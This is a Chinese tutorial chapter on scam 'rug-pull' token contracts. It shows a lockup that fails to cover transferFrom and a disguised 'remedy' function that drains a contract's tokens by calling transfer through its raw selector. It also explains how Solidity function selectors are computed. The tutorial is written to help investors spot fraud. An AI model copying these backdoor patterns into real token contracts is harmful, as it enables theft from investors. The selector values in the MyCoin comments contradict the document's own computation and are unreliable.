# 土狗合约:&nbsp;&nbsp;&nbsp;&nbsp;02.函数签名欺诈 

本章讲解土狗合约利用函数签名进行欺诈的有关知识。您可以学习到函数签名的用法，以及在编译后的合约代码中，是如何通过函数签名来执行对应函数的。

**视频**：[Bilibili](https://www.bilibili.com/video/BV1Th4y1y7gg)  |  [Youtube](https://youtu.be/hIvu0myHqYw)
<p align="center"><img src="./img/security-rugpull-v2.png" align="middle" /></p>

**官网**：[BinSchoolApp](https://binschool.app)

**代码**：[github.com/binschoolapp/rug-pull-contract](https://github.com/binschoolapp/rug-pull-contract)

**推特**：[@BinSchoolApp](https://twitter.com/BinSchoolApp)    **Discord**：[BinSchoolApp](https://discord.gg/PB2YEvggWq)   **微信**：bkra50 

-----
我们首先解决上一章节中留下的问题：合约创建者如何绕过锁定期，提前取走锁定的代币。

合约代码如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract LockCoin is ERC20 {
    uint256 lockTime = block.timestamp + 365 days; // 锁定期为1年
    address owner;  // 合约创建者

    // 校验合约创建者持币是否到期
    modifierlock() {
    	// 对合约创建者的操作进行校验
        if (msg.sender == owner) {
            // 锁定期满1年，才允许后续操作，否则回滚交易
            require(block.timestamp > lockTime, "It's still in the lockup period");
        }
        _;
    }

    // 发布代码为 MC 的代币，发行总量为 100
    constructor() ERC20("MyCoin", "MC") {
        owner = msg.sender; // 保存合约创建者
        _mint(msg.sender, 100*10**18);
    }

    // 转账操作需要符合锁定期校验
    function transfer(addressto, uint256 amount) public virtual override lock 
      returns (bool) {
        return super.transfer(to, amount);
    }
}
```

其实这个问题比较简单，对于那些有 **`ERC20`** 合约开发经验的人来说，答案是显而易见的。

操作方法就是利用 **`ERC20`** 合约中的授权接口 **`approve`**，和另一个转账接口 **`transferFrom`**，来实现将锁定的代币转走。

具体步骤如下：

- 第一步：合约创建者调用 **`approve`** 方法授权给另一个自己控制的账户。

- 第二步，使用自己控制的这个账户，调用 **`transferFrom`** 方法，将锁定的代币转走。

这个合约预留的后门，就是 **`lock`** 修饰器只锁定了转账函数 **`transfer`**，而没有锁定另一个转账函数 **`transferFrom`**。

## 函数签名欺诈合约

本章讲解土狗合约利用函数签名进行欺诈的有关知识。

我们先来看下面这个合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract FakeFuncSig is ERC20 {
    // 构造函数
    constructor() ERC20("MyCoin", "MC") {
        _mint(address(this), 100 * 10**18);
    }

    // ？？？
    function remedy(address addr) external returns (bool) {
        bytes memory data = abi.encodeWithSelector(0xa9059cbb, addr, balanceOf(address(this)));
        (bool success, ) = address(this).call(data);
        return success;
    }

    // 其它代码
    // ......
    // ......
}
```

在这个合约的构造函数中，合约给自己铸造了 100 个币。

那么 **`remedy`** 函数又是干什么的呢？看它的代码有点怪，使用 ABI 编码了一段数据作为参数，使用底层调用 **`call`** 了一下。

这个函数至少从表面上看不出在干什么。其实，这是一个恶意函数，它的目标是将合约中的代币一卷而空。这个恶意函数使用的就是利用函数签名进行欺诈。

## 什么是函数签名

在 **`Solidity`** 中，函数签名是指通过对函数名称和参数类型进行哈希运算，生成的唯一标识符。

在编译合约时，**`Solidity`** 编译器会根据函数的名称和参数类型，来计算函数签名，并将其嵌入到合约字节码中。

在已经编译好的合约的字节码中，函数签名是用来决定函数入口点的。

那么函数签名是如何计算的呢？

生成函数签名一共需要 3 步：

- 第一步：将函数的名称和参数类型按照规定的格式进行拼接

- 第二步：将拼接后的字符串进行 **`Keccak-256`** 哈希运算，得到 256 位的哈希值。

- 第三步：取这个 256 位哈希值的前 4 个字节，这个值就是函数的签名。

我们举个实际的例子，按照以上步骤具体算一下。

比如，**`ERC20`** 标准合约中 **`transfer`** 函数的原型是这样的：

```solidity
function transfer(address to, uint256 amount) public returns (bool)
```

我们来计算它的函数签名。

- 第一步，将函数名称和参数类型拼接成一个字符串，得到一个结果：

```solidity
transfer(address,uint256)
```

- 第二步，将拼接后的字符串执行哈希运算，得到 256 位哈希值：

```solidity
0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b
```

- 第三步，取哈希值的前4个字节，得到最终结果：

```solidity
0xa9059cbb
```

这 4 个字节就是函数 **`transfer`** 的签名。

我把这个计算过程写成了一个合约，您可以把它复制到 Remix 里自己试一下。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract CalcFuncSig {
    // 生成函数签名
    function sig(string calldata str) external pure returns(bytes4){
        return bytes4(keccak256(bytes(str)));
    }
}
```

## 如何使用函数签名

我们看一个合约的源码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MyCoin {
    // 函数签名为 0x9d61d234
    function transfer(address to, uint256 amount) public returns (bool) {
    	 // ......
        return true;
    }

    // 函数签名为 0x8b069f2a
    function approve(address spender, uint256 amount) public returns (bool) {
    	// ......
        return true;
    }
}
```

这个合约里有两个函数 **`transfer`** 和 **`approve`**。

这个合约经过编译后变成字节码后，会变成这样的一种结构：

外部调用合约方法时，都是会执行这同一份代码。只不过调用不同的方法时，**`EVM`** 会根据调用请求中的 **`msg.sig`** 里的函数签名，决定执行哪一段代码。

外部调用的时候，请求数据就会填充到 **`msg`** 这个数据结构中，所以说，函数签名是用来决定函数入口点的。

由于函数签名是函数名称和参数类型拼接在一起，再进行哈希，截取部分哈希值生成的，所以不同的函数声明，它的函数签名是不同的。而且经过这么处理后，函数签名的数据长度统一，并且简短，易于处理。

这也是编译后合约在内部使用函数签名的原因。

## 函数签名欺诈分析

有了这些知识，我们再回头看土狗合约的欺诈问题。

```solidity
  function remedy(address addr) external returns (bool) {
      bytes memory data = abi.encodeWithSelector(0xa9059cbb, addr, balanceOf(address(this)));
      (bool success, ) = address(this).call(data);
      return success;
  }
```

这段代码中，其实就是使用了 **`transfer`** 方法的签名，将合约中的代币全部转走的。

这个 0xa9 打头的数据实际上就是 **`transfer`** 的函数签名。

它通过对 **`transfer`** 函数签名，再拼接了接收地址 **`addr`**，以及合约中的所有余额，打包起来。

然后做为一个参数，传递给底层调用 **`call`**。

执行成功后，合约中的代币被清空，全部转给了 **`addr`**。

所以，这个 remedy 函数，我们改写一下，其实就等价于这种写法。

```solidity
function remedy(address addr) external returns(bool) {
    bool success = transfer(addr, balanceOf(address(this)));
    return success;
}
```

但这种写法，欺骗手段太明显了，很多资深投资者一眼就能看穿。土狗合约的欺诈者为了迷惑投资者，于是就使用了函数签名这种欺诈手法。

我们下一视频会讲解代理合约的知识，以及土狗合约如何使用代理合约进行欺诈。